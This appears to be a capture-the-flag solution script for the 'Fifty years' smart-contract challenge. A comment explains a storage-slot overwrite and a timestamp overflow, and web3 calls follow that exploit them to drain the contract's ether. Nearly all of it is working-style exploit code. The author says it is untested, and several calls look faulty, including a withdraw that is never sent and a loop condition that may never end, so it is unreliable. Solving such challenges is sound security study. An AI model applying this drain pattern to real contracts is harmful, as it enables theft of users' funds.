/*
	NOTE THAT THIS HAS NOT BEEN TESTED

	Two vulnerabilites : the 'contribution' variable which overwrites the slot 0 (queue.length) and slot 1 (head) and the timestamp overflow.
	
	Combining the two makes possible to control the 'head' and maximum 'index' when calling the withdraw function. But since there is an '<= index', we cannot withdraw all funds immediately.

	Basically, we need to set the timestamp of the 'index' called by 'withdraw()' to zero which requires 2 calls to upsert initially. However, the loop requires a third 'index' value (equal sign) so
	this third contribution needs to be crafted such as it is possible to drain the 'amount' associated with it later. 

	We then need to drain the contract of the remaining Wei with upsert of 1 wei at a time
*/
challenge_contract_address = "0xFC637253590a94810352e121344E0c41D2394325"
player = "0x164f58B4CdDd3D5fD430BeA9aA22D804157b8d44"

abi_fifty_years = [{"inputs":[{"internalType":"address","name":"player","type":"address"}],"payable":true,"stateMutability":"payable","type":"constructor"},{"constant":true,"inputs":[],"name":"isComplete","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"index","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"upsert","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"index","type":"uint256"}],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]
contract_fifty_years = new web3.eth.Contract(abi_fifty_years, challenge_contract_address)

timestamp_max = BigInt(2**256) - BigInt(86000)
timestamp_value = 86000

await contract_fifty_years.methods.upsert(1, timestamp_max).send({"from":player, "value":1});
await contract_fifty_years.methods.upsert(2, 0).send({"from":player, "value":2});
await contract_fifty_years.methods.upsert(3, timestamp_value).send({"from":player, "value":3});
await contract_fifty_years.methods.withdraw(3);
while (await web3.eth.getBalance(challenge_contract_address)){
	await contract_fifty_years.methods.upsert(0, timestamp_max).send({"from":player, "value":0});
	await contract_fifty_years.methods.upsert(1, 0).send({"from":player, "value":0});
	await contract_fifty_years.methods.withdraw(0);
}